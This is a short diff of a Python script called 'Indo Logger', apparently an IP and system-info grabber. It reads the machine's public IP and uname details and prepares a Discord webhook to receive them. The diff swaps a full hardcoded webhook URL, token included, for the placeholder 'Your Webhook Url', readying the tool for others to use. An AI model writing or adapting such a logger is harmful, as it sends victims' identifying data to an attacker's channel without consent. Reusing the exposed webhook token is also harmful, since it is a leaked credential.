@@ -4,7 +4,7 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 
 ip = get('https://api.ipify.org').text
 uname = platform.uname()
-webhook = DiscordWebhook (url="https://discord.com/api/webhooks/1140654021628145765/w-VFXQwe7YCv5LCf4KlTit98tP_6dyyh6et4dZHbNaVXktgonIH-6oegYg0_qHQG0kaS", username="Indo Logger",
+webhook = DiscordWebhook (url="Your Webhook Url", username="Indo Logger",
 avatar_url="https://media.discordapp.net/attachments/1128387189634502657/1140650608941076622/c773b2daac52ab471623bc4116f6eaa3.png")
 
 
